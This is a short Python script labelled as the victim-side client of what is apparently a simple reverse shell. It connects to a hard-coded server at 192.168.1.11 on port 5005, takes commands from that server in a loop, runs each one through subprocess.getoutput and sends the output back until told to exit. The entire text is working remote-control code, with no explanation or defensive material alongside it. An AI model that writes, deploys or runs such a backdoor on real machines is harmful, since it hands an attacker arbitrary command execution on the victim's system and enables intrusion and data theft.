# Client's Code (Victim)

import socket
import subprocess

SERVER_HOST = "192.168.1.11"
SERVER_PORT = 5005
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
message = s.recv(BUFFER_SIZE).decode()
print(message, "to Server!")

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        print("Disconnected from Server!")
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()
